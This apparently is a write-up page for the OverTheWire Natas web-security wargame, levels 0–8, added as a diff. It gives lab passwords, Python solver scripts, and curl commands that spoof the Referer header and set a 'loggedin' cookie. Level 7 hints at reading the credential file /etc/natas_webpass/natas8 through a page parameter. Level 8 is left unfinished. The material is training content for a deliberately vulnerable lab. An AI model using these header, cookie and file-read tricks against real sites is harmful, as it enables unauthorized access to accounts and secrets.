@@ -1,0 +1,941 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <title> overTheWire | Natas </title>
+  <link rel="shortcut icon" href="/img/favicon.ico" width="70">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/fonts/fonts.css" >
+    <link rel="stylesheet" href="/res/bootstrap.min.css">
+    <link rel="stylesheet" href="/res/w3.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/personal_icon.css">
+    <link rel="stylesheet" href="/res/prism_themes/prism-base16-ateliersulphurpool.light.css">
+    <link rel="stylesheet" href="../ctf.css">
+    <link rel="stylesheet" href="../../css/sidebar.css">
+</head>
+
+<body>
+
+  <!-- Navbar -->
+  <div id="include_navbar"></div>
+
+  <!-- Return to Top -->
+  <a href="javascript:" id="return-to-top"><i class="fas fa-chevron-up"></i></a>
+
+  <!-- Sidebar Nav -->
+  <div id="include_sidebar"></div>
+
+  <!-- Main -->
+  <main>
+    <div class="swipe-area"></div>
+    <br><br><br>
+    <div class="container">
+      <article role="article">
+        <h3> Natas Writeup </h3>
+        <br>
+
+        <dl class="toc">
+          <h4> Table of Contents </h4>
+          <ol class="two-colums">
+            <li> <a href="#level-start"> Intro Reading </a></li>
+            <li> <a href="#level-0"> Level 0 -> Level 1 </a></li>
+            <li> <a href="#level-1"> Level 1 -> Level 2 </a></li>
+            <li> <a href="#level-2"> Level 2 -> Level 3 </a></li>
+            <li> <a href="#level-3"> Level 3 -> Level 4 </a></li>
+            <li> <a href="#level-4"> Level 4 -> Level 5 </a></li>
+            <li> <a href="#level-5"> Level 5 -> Level 6 </a></li>
+            <li> <a href="#level-6"> Level 6 -> Level 7 </a></li>
+            <li> <a href="#level-7"> Level 7 -> Level 8 </a></li>
+            <li> <a href="#level-8"> Level 8 -> Level 9 </a></li>
+          </ol>
+        </dl>
+        <hr style="margin-bottom: 3em; width: 30%; margin-left: 35%;">
+
+<!-- Start post  -->
+        <dl class="anchor" id="level-start">
+          <dt> Intro Reading </dt>
+          <dd> Natas teaches the basics of serverside web-security. <br> <br>
+
+          Each level of natas consists of its own website located at <b> http://natasX.natas.labs.overthewire.org </b>, where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password. <br> <br>
+
+          Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5. <br> <br>
+
+          Start here:
+          </dd>
+        </dl>
+
+        <dl>
+          <blockquote>
+            <p><strong> To login to the first level: </strong> <br>
+              Username: natas0 <br>
+              Password: natas0 <br>
+              URL: http://natas0.natas.labs.overthewire.org
+            </p>
+          </blockquote>
+        </dl>
+        <hr>
+<!-- Finish post  -->
+
+<!-- Start post  -->
+        <dl class="anchor" id="level-0">
+          <dt> Level 0 -> Level 1 </dt>
+        </dl>
+
+        <figure>
+          <img src="img/natas-0.png" alt="" />
+        </figure>
+
+        <dl>
+          Just do a page inspection to find the password
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-html">
+&lt;head>
+    &lt;!-- This stuff in the header has nothing to do with the level -->
+    &lt;link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+    &lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css">
+    &lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css">
+    &lt;script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/jquery-ui.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/wechall-data.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/wechall.js">&lt;/script>
+    &lt;script>
+        var wechallinfo =
+        {
+            "level": "natas0",
+            "pass": "natas0"
+        };
+    &lt;/script>
+&lt;/head>
+
+&lt;body>
+    &lt;h1>natas0&lt;/h1>
+    &lt;div id="content">
+        You can find the password for the next level on this page.
+
+        &lt;!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
+    &lt;/div>
+
+    &lt;div id="wechallform" style="display: block;" class="ui-draggable">
+        &lt;p>Submit token&lt;/p>
+        &lt;form id="realwechallform" action="https://www.wechall.net/10-levels-on-Natas.html" enctype="application/x-www-form-urlencoded" method="post">
+            &lt;input type="hidden" name="wfid" value="1">
+            &lt;input type="hidden" name="password_solution"value="natas0">
+            &lt;input type="hidden" name="igotitnow" value="Register">
+        &lt;/form>
+    &lt;/div>
+&lt;/body>
+            </code></pre>
+        </div>
+
+        <dl>
+          Following the python script to solve this challenge:
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-python">
+#!/usr/bin/env python3
+
+import requests
+import re
+
+username = "natas0"
+password = "natas0"
+
+url = "http://{}.natas.labs.overthewire.org".format(username)
+
+response = requests.get(url, auth= (username, password))
+content = response.text
+
+#print(content)
+print(re.findall("&lt;!--The password for natas1 is (.*) -->", content)[0])
+            </code></pre>
+        </div>
+
+
+        <dl>
+          <blockquote>
+            <p><strong> To login to the next level: </strong> <br>
+              Username: natas1 <br>
+              Password: gtVrDuiDfck831PqWsLEZy5gyDz1clto <br>
+              URL: http://natas0.natas.labs.overthewire.org
+            </p>
+          </blockquote>
+        </dl>
+        <hr>
+<!-- Finish post  -->
+<!-- Start post  -->
+        <dl class="anchor" id="level-1">
+          <dt> Level 1 -> Level 2 </dt>
+        </dl>
+
+        <figure>
+          <img src="img/natas-1.png" alt="" />
+        </figure>
+
+        <dl>
+          Again, do a page inspection to find the password but before disable the js of the page.
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-html">
+&lt;head>
+    &lt;!-- This stuff in the header has nothing to do with the level -->
+    &lt;link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+    &lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css">
+    &lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css">
+    &lt;script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/jquery-ui.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/wechall-data.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/wechall.js">&lt;/script>
+    &lt;script>
+        var wechallinfo =
+        {
+            "level": "natas1",
+            "pass": "gtVrDuiDfck831PqWsLEZy5gyDz1clto"
+        };
+    &lt;/script>
+&lt;/head>
+
+&lt;body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
+    &lt;h1>natas1&lt;/h1>
+    &lt;div id="content">
+        You can find the password for the next level on this page, but rightclicking has been blocked!
+
+        &lt;!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
+    &lt;/div>
+
+    &lt;div id="wechallform" style="display: block;" class="ui-draggable">
+        &lt;p>Submit token&lt;/p>
+        &lt;form id="realwechallform" action="https://www.wechall.net/10-levels-on-Natas.html" enctype="application/x-www-form-urlencoded" method="post">
+            &lt;input type="hidden" name="wfid" value="2">
+            &lt;input type="hidden" name="password_solution" value="gtVrDuiDfck831PqWsLEZy5gyDz1clto">
+            &lt;input type="hidden" name="igotitnow" value="Register">
+        &lt;/form>
+    &lt;/div>
+&lt;/body>
+            </code></pre>
+        </div>
+
+        <dl>
+          Following the python script to solve this challenge:
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-python">
+#!/usr/bin/env python3
+
+import requests
+import re
+
+username = "natas1"
+password = "gtVrDuiDfck831PqWsLEZy5gyDz1clto"
+
+url = "http://{}.natas.labs.overthewire.org".format(username)
+
+response = requests.get(url, auth= (username, password))
+content = response.text
+
+#print(content)
+print(re.findall("&lt;!--The password for natas2 is (.*) -->", content)[0])
+            </code></pre>
+        </div>
+
+        <dl>
+          <blockquote>
+            <p><strong> To login to the next level: </strong> <br>
+              Username: natas2 <br>
+              Password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi <br>
+              URL: http://natas2.natas.labs.overthewire.org
+            </p>
+          </blockquote>
+        </dl>
+        <hr>
+<!-- Finish post  -->
+<!-- Start post  -->
+        <dl class="anchor" id="level-2">
+          <dt> Level 2 -> Level 3 </dt>
+        </dl>
+
+        <figure>
+          <img src="img/natas-2.png" alt="" />
+        </figure>
+
+        <div class="row-full code">
+          <pre><code class="prism language-html">
+&lt;head>
+    &lt;!-- This stuff in the header has nothing to do with the level -->
+    &lt;link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+    &lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css">
+    &lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css">
+    &lt;script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/jquery-ui.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/wechall-data.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/wechall.js">&lt;/script>
+    &lt;script>
+        var wechallinfo =
+        {
+            "level": "natas2",
+            "pass": "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi"
+        };
+    &lt;/script>
+&lt;/head>
+
+&lt;body>
+    &lt;h1>natas2&lt;/h1>
+    &lt;div id="content">
+        There is nothing on this page
+        &lt;img src="files/pixel.png">
+    &lt;/div>
+
+    &lt;div id="wechallform" style="display: block;" class="ui-draggable">
+        &lt;p>Submit token&lt;/p>
+        &lt;form id="realwechallform" action="https://www.wechall.net/10-levels-on-Natas.html" enctype="application/x-www-form-urlencoded" method="post">
+            &lt;input type="hidden" name="wfid" value="3">
+            &lt;input type="hidden" name="password_solution" value="ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi">
+            &lt;input type="hidden" name="igotitnow" value="Register">
+        &lt;/form>
+    &lt;/div>
+&lt;/body>
+            </code></pre>
+        </div>
+
+        <dl>
+          As we can see from the HTML code, there is a picture stored in <b> files/pixel.png </b>. If we address that link we found an image with one white pixel. What we can try here is to access only a portion of that path (just the <b> /file</b> part) and see if we can find something.
+        </dl>
+
+        <figure>
+          <img src="img/natas-2-1.png" alt="" />
+        </figure>
+
+        <dl>
+          As expected there is a <b> users.txt </b> file storing the password for the next level
+        </dl>
+
+        <dl>
+          Following the python script to solve this challenge:
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-python">
+#!/usr/bin/env python3
+
+import requests
+import re
+
+username = "natas2"
+password = "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi"
+
+url = "http://{}.natas.labs.overthewire.org/files/users.txt".format(username)
+
+response = requests.get(url, auth= (username, password))
+content = response.text
+
+#print(content)
+print(re.findall("natas3:(.*)", content)[0])
+            </code></pre>
+        </div>
+
+        <dl>
+          <blockquote>
+            <p><strong> To login to the next level: </strong> <br>
+              Username: natas3 <br>
+              Password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 <br>
+              URL: http://natas3.natas.labs.overthewire.org
+            </p>
+          </blockquote>
+        </dl>
+        <hr>
+<!-- Finish post  -->
+<!-- Start post  -->
+        <dl class="anchor" id="level-3">
+          <dt> Level 3 -> Level 4 </dt>
+        </dl>
+
+        <figure>
+          <img src="img/natas-3.png" alt="" />
+        </figure>
+
+        <div class="row-full code">
+          <pre><code class="prism language-html">
+&lt;head>
+    &lt;!-- This stuff in the header has nothing to do with the level -->
+    &lt;link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+    &lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css">
+    &lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css">
+    &lt;script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/jquery-ui.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/wechall-data.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/wechall.js">&lt;/script>
+    &lt;script>
+        var wechallinfo =
+        {
+            "level": "natas3",
+            "pass": "sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14"
+        };
+    &lt;/script>
+&lt;/head>
+
+&lt;body>
+    &lt;h1>natas3&lt;/h1>
+    &lt;div id="content">
+        There is nothing on this page
+        &lt;!-- No more information leaks!! Not even Google will find it this time... -->
+    &lt;/div>
+
+    &lt;div id="wechallform" style="display: block;" class="ui-draggable">
+        &lt;p>Submit token&lt;/p>
+        &lt;form id="realwechallform" action="https://www.wechall.net/10-levels-on-Natas.html" enctype="application/x-www-form-urlencoded" method="post">
+            &lt;input type="hidden" name="wfid" value="4">
+            &lt;input type="hidden" name="password_solution" value="sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14">
+            &lt;input type="hidden" name="igotitnow" value="Register">
+        &lt;/form>
+    &lt;/div>
+&lt;/body>
+            </code></pre>
+        </div>
+
+        <dl>
+          As we can see from the HTML code, this time there is nothing on the page. What we can try here, since the comment suggest us that not even Google can find it, it'is to see if there is the so called <b> robots.txt </b> file.
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-txt">
+User-agent: *
+Disallow: /s3cr3t/
+            </code></pre>
+        </div>
+
+        <dl>
+          That's it. Let's navigate to <b> /s3cr3t/ </b> path; the password for the next level is into the <b>users.txt</b> file.
+        </dl>
+
+        <dl>
+          Following the python script to solve this challenge:
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-python">
+#!/usr/bin/env python3
+
+import requests
+import re
+
+username = "natas3"
+password = "sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14"
+
+url = "http://{}.natas.labs.overthewire.org/s3cr3t/users.txt".format(username)
+
+response = requests.get(url, auth= (username, password))
+content = response.text
+
+#print(content)
+print(re.findall("natas4:(.*)", content)[0])
+            </code></pre>
+        </div>
+
+        <dl>
+          <blockquote>
+            <p><strong> To login to the next level: </strong> <br>
+              Username: natas4 <br>
+              Password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ <br>
+              URL: http://natas4.natas.labs.overthewire.org
+            </p>
+          </blockquote>
+        </dl>
+        <hr>
+<!-- Finish post  -->
+
+<!-- Start post  -->
+        <dl class="anchor" id="level-4">
+          <dt> Level 4 -> Level 5 </dt>
+        </dl>
+
+        <figure>
+          <img src="img/natas-4.png" alt="" />
+        </figure>
+
+        <div class="row-full code">
+          <pre><code class="prism language-html">
+&lt;head>
+    &lt;!-- This stuff in the header has nothing to do with the level -->
+    &lt;link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+    &lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css">
+    &lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css">
+    &lt;script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/jquery-ui.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/wechall-data.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/wechall.js">&lt;/script>
+    &lt;script>
+        var wechallinfo =
+        {
+            "level": "natas4",
+            "pass": "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"
+        };
+    &lt;/script>
+&lt;/head>
+
+&lt;body>
+    &lt;h1>natas4&lt;/h1>
+    &lt;div id="content">
+
+        Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
+        &lt;br>
+        &lt;div id="viewsource">&lt;a href="index.php">Refresh page&lt;/a>&lt;/div>
+    &lt;/div>
+
+    &lt;div id="wechallform" style="display: block;" class="ui-draggable">
+        &lt;p>Submit token&lt;/p>
+        &lt;form id="realwechallform" action="https://www.wechall.net/10-levels-on-Natas.html" enctype="application/x-www-form-urlencoded" method="post">
+            &lt;input type="hidden" name="wfid" value="5">
+            &lt;input type="hidden" name="password_solution" value="Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ">
+            &lt;input type="hidden" name="igotitnow" value="Register">
+        &lt;/form>
+    &lt;/div>
+&lt;/body>
+            </code></pre>
+        </div>
+
+        <dl>
+          As the HTML code suggest us, the only way to access this page is by being natas5 user. In order to do this, we need to modify the header of the request, particularly the <b> referer </b> voice. There are two way to do this: one from the inspection panel under the netwotk tab, the other one by command line. For the second one, we need to copy the request as curl and paste in the terminal.
+        </dl>
+
+        <figure>
+          <img src="img/natas-4-1.png" alt="" />
+        </figure>
+
+        <div class="row-full code">
+          <pre><code class="prism language-bash">
+curl 'http://natas4.natas.labs.overthewire.org/index.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3' --compressed -H 'DNT: 1' -H 'Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va' -H 'Connection: keep-alive' -H 'Referer: http://natas5.natas.labs.overthewire.org/' -H 'Cookie: __utma=176859643.1359787830.1583506714.1585744212.1585749553.11; __utmc=176859643; __utmz=176859643.1585734323.8.4.utmcsr=ctf.cyberchallenge.it|utmccn=(referral)|utmcmd=referral|utmcct=/W04' -H 'Upgrade-Insecure-Requests: 1'
+            </code></pre>
+        </div>
+
+        <dl>
+          Following the python script to solve this challenge:
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-python">
+#!/usr/bin/env python3
+
+import requests
+import re
+
+username = "natas4"
+password = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"
+
+headers = {"Referer" : "http://natas5.natas.labs.overthewire.org/"}
+
+url = "http://{}.natas.labs.overthewire.org/".format(username)
+
+response = requests.get(url, auth= (username, password), headers=headers)
+content = response.text
+
+#print(content)
+print(re.findall("The password for natas5 is (.*)", content)[0])
+            </code></pre>
+        </div>
+
+        <dl>
+          <blockquote>
+            <p><strong> To login to the next level: </strong> <br>
+              Username: natas5 <br>
+              Password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq <br>
+              URL: http://natas5.natas.labs.overthewire.org
+            </p>
+          </blockquote>
+        </dl>
+        <hr>
+<!-- Finish post  -->
+
+<!-- Start post  -->
+        <dl class="anchor" id="level-5">
+          <dt> Level 5 -> Level 6 </dt>
+        </dl>
+
+        <figure>
+          <img src="img/natas-5.png" alt="" />
+        </figure>
+
+        <div class="row-full code">
+          <pre><code class="prism language-html">
+&lt;head>
+    &lt;!-- This stuff in the header has nothing to do with the level -->
+    &lt;link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+    &lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css">
+    &lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css">
+    &lt;script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/jquery-ui.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/wechall-data.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/wechall.js">&lt;/script>
+    &lt;script>
+        var wechallinfo =
+        {
+            "level": "natas5",
+            "pass": "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
+        };
+    &lt;/script>
+&lt;/head>
+
+&lt;body>
+    &lt;h1>natas5&lt;/h1>
+    &lt;div id="content">
+        Access disallowed. You are not logged in&lt;/div>
+
+    &lt;div id="wechallform" style="display: block;" class="ui-draggable">
+        &lt;p>Submit token&lt;/p>
+        &lt;form id="realwechallform" action="https://www.wechall.net/10-levels-on-Natas.html" enctype="application/x-www-form-urlencoded" method="post">
+            &lt;input type="hidden" name="wfid" value="6">
+            &lt;input type="hidden" name="password_solution" value="iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq">
+            &lt;input type="hidden" name="igotitnow" value="Register">
+        &lt;/form>
+    &lt;/div>
+&lt;/body>
+            </code></pre>
+        </div>
+
+        <dl>
+          As the HTML code suggest us, we are not logged in. After some web ispection, we found under the storage tab a cookie named <b> loggedin </b> set to 0. Again, as before, to set this to 1 we can change the value from the ispection panel or from command line.
+        </dl>
+
+        <figure>
+          <img src="img/natas-5-1.png" alt="" />
+        </figure>
+
+        <div class="row-full code">
+          <pre><code class="prism language-bash">
+curl 'http://natas5.natas.labs.overthewire.org/index.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3' --compressed -H 'DNT: 1' -H 'Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx' -H 'Connection: keep-alive' -H 'Cookie: __utma=176859643.1359787830.1583506714.1585744212.1585749553.11; __utmc=176859643; __utmz=176859643.1585734323.8.4.utmcsr=ctf.cyberchallenge.it|utmccn=(referral)|utmcmd=referral|utmcct=/W04; loggedin=1' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0'
+            </code></pre>
+        </div>
+
+        <dl>
+          Following the python script to solve this challenge:
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-python">
+#!/usr/bin/env python3
+
+import requests
+import re
+
+username = "natas5"
+password = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
+
+headers = {}
+cookies = {"loggedin" : "1"}
+url = "http://{}.natas.labs.overthewire.org/".format(username)
+
+session = requests.Session()
+response = session.get( url,
+                        auth= (username, password),
+                        headers=headers,
+                        cookies=cookies)
+content = response.text
+
+#print(content)
+print(re.findall(" natas6 is (.*)&lt;/div>", content)[0])
+            </code></pre>
+        </div>
+
+        <dl>
+          <blockquote>
+            <p><strong> To login to the next level: </strong> <br>
+              Username: natas6 <br>
+              Password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 <br>
+              URL: http://natas6.natas.labs.overthewire.org
+            </p>
+          </blockquote>
+        </dl>
+        <hr>
+<!-- Finish post  -->
+
+<!-- Start post  -->
+        <dl class="anchor" id="level-6">
+          <dt> Level 6 -> Level 7 </dt>
+        </dl>
+
+        <figure>
+          <img src="img/natas-6.png" alt="" />
+        </figure>
+
+        <dl>
+          This levele request us to find a password to submit inside the input secre field. By viewing the source code, the output is the following
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-html">
+&lt;html>
+
+&lt;head>
+    &lt;!-- This stuff in the header has nothing to do with the level -->
+    &lt;link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+    &lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+    &lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+    &lt;script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/jquery-ui.js">&lt;/script>
+    &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js>&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/wechall.js">&lt;/script>
+    &lt;script>
+        var wechallinfo =
+        {
+            "level": "natas6",
+            "pass": "&lt;censored>"
+        };
+    &lt;/script>
+&lt;/head>
+
+&lt;body>
+    &lt;h1>natas6&lt;/h1>
+    &lt;div id="content">
+
+        &lt;?
+include "includes/secret.inc";
+
+    if(array_key_exists("submit", $_POST)) {
+        if($secret == $_POST['secret']) {
+          print "Access granted. The password for natas7 is &lt;censored>";
+        } else {
+          print "Wrong secret";
+        }
+    }
+?>
+            &lt;form method=post>
+                Input secret:
+                &lt;input name=secret>
+                &lt;br>
+                &lt;input type=submit name=submit>
+            &lt;/form>
+
+            &lt;div id="viewsource">&lt;a href="index-source.html">View sourcecode&lt;/a>&lt;/div>
+    &lt;/div>
+&lt;/body>
+
+&lt;/html>
+            </code></pre>
+        </div>
+
+        <dl>
+          As the HTML code inside <code> &lt;? .. ?> </code> suggest, there is a file called <b>secret.inc</b>. Just by addressing that file we are able to get our secret which is hide inside the html code of the page. Insert it in the secret input field will give us the password for the next level.
+        </dl>
+
+        <dl>
+          <blockquote>
+            <p><strong> To login to the next level: </strong> <br>
+              Username: natas7 <br>
+              Password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 <br>
+              URL: http://natas7.natas.labs.overthewire.org
+            </p>
+          </blockquote>
+        </dl>
+        <hr>
+<!-- Finish post  -->
+
+<!-- Start post  -->
+        <dl class="anchor" id="level-7">
+          <dt> Level 7 -> Level 8 </dt>
+        </dl>
+
+        <figure>
+          <img src="img/natas-7.png" alt="" />
+        </figure>
+
+        <dl>
+          This time we are asked to find a password with apparently no hint in the homepage. By clicking both on <b> Home </b> or <b> About </b> and ispecting the HTML code we find that there is one:
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-html">
+&lt;head>
+    &lt;!-- This stuff in the header has nothing to do with the level -->
+    &lt;link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+    &lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css">
+    &lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css">
+    &lt;script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/jquery-ui.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/wechall-data.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/wechall.js">&lt;/script>
+    &lt;script>
+        var wechallinfo =
+        {
+            "level": "natas7",
+            "pass": "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"
+        };
+    &lt;/script>
+&lt;/head>
+
+&lt;body>
+    &lt;h1>natas7&lt;/h1>
+    &lt;div id="content">
+
+        &lt;a href="index.php?page=home">Home&lt;/a>
+        &lt;a href="index.php?page=about">About&lt;/a>
+        &lt;br>
+        &lt;br> this is the about page
+
+        &lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+    &lt;/div>
+
+    &lt;div id="wechallform" style="display: block;" class="ui-draggable">
+        &lt;p>Submit token&lt;/p>
+        &lt;form id="realwechallform" action="https://www.wechall.net/10-levels-on-Natas.html" enctype="application/x-www-form-urlencoded" method="post">
+            &lt;input type="hidden" name="wfid" value="8">
+            &lt;input type="hidden" name="password_solution" value="7z3hEENjQtflzgnT29q7wAvMNfZdh0i9">
+            &lt;input type="hidden" name="igotitnow" value="Register">
+        &lt;/form>
+    &lt;/div>
+&lt;/body>
+            </code></pre>
+        </div>
+
+        <dl>
+          Just adding the address at the end of the page give us our password for the next level
+        </dl>
+
+        <dl>
+          <blockquote>
+            <p><strong> To login to the next level: </strong> <br>
+              Username: natas8 <br>
+              Password:  DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe  <br>
+              URL: http://natas8.natas.labs.overthewire.org
+            </p>
+          </blockquote>
+        </dl>
+        <hr>
+<!-- Finish post  -->
+
+<!-- Start post  -->
+        <dl class="anchor" id="level-8">
+          <dt> Level 8 -> Level 9 </dt>
+        </dl>
+
+        <figure>
+          <img src="img/natas-8.png" alt="" />
+        </figure>
+
+        <dl>
+          This challenge looks like natas6 challenge.
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-html">
+&lt;html>
+&lt;head>
+    &lt;!-- This stuff in the header has nothing to do with the level -->
+    &lt;link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+    &lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+    &lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+    &lt;script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js">&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/jquery-ui.js">&lt;/script>
+    &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js>&lt;/script>
+    &lt;script src="http://natas.labs.overthewire.org/js/wechall.js">&lt;/script>
+    &lt;script>
+        var wechallinfo =
+        {
+            "level": "natas8",
+            "pass": "&lt;censored>"
+        };
+    &lt;/script>
+&lt;/head>
+
+&lt;body>
+    &lt;h1>natas8&lt;/h1>
+    &lt;div id="content">
+
+        &lt;?
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+}
+
+if(array_key_exists("submit", $_POST)) {
+    if(encodeSecret($_POST['secret']) == $encodedSecret) {
+    print "Access granted. The password for natas9 is &lt;censored>";
+    } else {
+    print "Wrong secret";
+    }
+}
+?>
+            &lt;form method=post>
+                Input secret:
+                &lt;input name=secret>
+                &lt;br>
+                &lt;input type=submit name=submit>
+            &lt;/form>
+
+            &lt;div id="viewsource">&lt;a href="index-source.html">View sourcecode&lt;/a>&lt;/div>
+    &lt;/div>
+&lt;/body>
+&lt;/html>
+            </code></pre>
+        </div>
+
+        <dl>
+          ...
+        </dl>
+
+        <dl>
+          <blockquote>
+            <p><strong> To login to the next level: </strong> <br>
+              Username: natas9 <br>
+              Password:    <br>
+              URL: http://natas9.natas.labs.overthewire.org
+            </p>
+          </blockquote>
+        </dl>
+        <hr>
+<!-- Finish post  -->
+
+
+    </article>
+
